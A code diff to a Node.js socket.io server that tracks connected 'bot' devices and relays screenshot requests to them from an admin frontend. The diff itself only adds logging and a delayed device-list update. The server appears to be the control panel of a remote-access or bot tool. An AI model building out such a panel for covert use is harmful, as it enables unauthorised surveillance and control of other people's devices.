@@ -86,6 +86,8 @@ botIo.on("connection", async (socket) => {
         ).catch(console.error);
 
         console.log(chalk.green(`[+] Bot Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
+        console.log(chalk.blue(`[i] Device ${deviceUuid} status updated to: connected = ${device.connected}`))
+
         if (adminSoc) {
             const deviceList = Array.from(devices.values()).map((d) => ({
                 ...d.info,
@@ -93,6 +95,9 @@ botIo.on("connection", async (socket) => {
                 connected: d.connected
             })).slice(0, 20);
             adminSoc.emit("info", deviceList);
+            console.log(chalk.blue(`[i] Status update sent to frontend (${deviceList.filter(d => d.connected).length} connected devices)`));
+        } else {
+            console.log(chalk.yellow(`[w] Frontend not connected - status update will be sent when frontend connects`));
         }
 
         socket.on("disconnect", async () => {
@@ -210,6 +215,16 @@ masterIo.on("connection", (socket) => {
                 socket.emit("device_logs", []);
             }
         });
+
+        setTimeout(() => {
+            const currentDeviceList = Array.from(devices.values()).map((d) => ({
+                ...d.info,
+                ID: d.info.device_uuid,
+                connected: d.connected
+            })).slice(0, 20);
+
+            socket.emit("info", currentDeviceList);
+        }, 1000); // Esperar 1 segundo para asegurar que la conexión esté estable
 
         socket.on("screenshot_req", (deviceId) => {
             console.log(`Relaying screenshot request to device: ${deviceId}`);
